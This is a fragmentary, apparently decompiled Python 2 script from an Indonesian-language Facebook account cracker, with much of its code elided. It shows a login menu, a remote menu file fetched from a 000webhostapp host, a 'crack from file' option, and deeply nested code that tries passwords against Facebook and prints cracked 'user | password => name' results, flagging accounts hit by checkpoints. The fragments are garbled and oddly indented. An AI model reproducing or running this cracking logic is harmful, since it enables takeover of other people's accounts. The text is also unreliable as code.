...
def login():
    ...
    try:
        ...
        print '\x1b[1;91m[\xe2\x98\x86] \x1b[1;92mLOGIN AKUN FACEBOOK ANDA \x1b[1;91m[\xe2\x98\x86]'
        ...
        if 'checkpoint' in url:
            print '\n\x1b[1;91m[!] \x1b[1;93mAkun Terkena Checkpoint'
...
def pilih():
    ...
    if zedd == '':
        ...
        if zedd == '1':
            ...
            if zedd == '2':
                r = requests.get('https://zhuwi.000webhostapp.com/zhuwi/menuhack.txt').text
                if 'tutup' in r:
...
def mini():
    ...
    try:
        ...
        print logo
        print 40 * '\x1b[1;97m\xe2\x95\x90'
        print '\x1b[1;91m[ INFO ] Anda harus berteman dengan akun target terlebih dahulu !'
        try:
...
def super():
    ...
    print '\x1b[1;37;40m4. Crack dari File'
    print '\x1b[1;31;40m0. Kembali'
    print
    print
    pilih_super()
																		...
																		if 'www.facebook.com' in q['error_msg']:
																			...
																			if 'access_token' in q:
																				...
																				if 'www.facebook.com' in q['error_msg']:
																					...
																					q = json.load(data)
																					if 'access_token' in q:
																						print '\x1b[1;97m[\x1b[1;92mOK\xe2\x9c\x93\x1b[1;97m] ' + user + ' | ' + pass10 + ' => '  + b['name']
																					else:
										
																						if 'www.facebook.com' in q['error_msg']:
																							print '\x1b[1;97m[\x1b[1;93mCP\xe2\x9c\x9a\x1b[1;97m] ' + user + ' | ' + pass10 + ' => '  + b['name']
...
def lain():
    ...
    print
    print '\x1b[1;97m  ->Akan Segera Datang'
    print
    print '\x1b[1;31;40m0. Kembali'
    print
    pilih_lain()
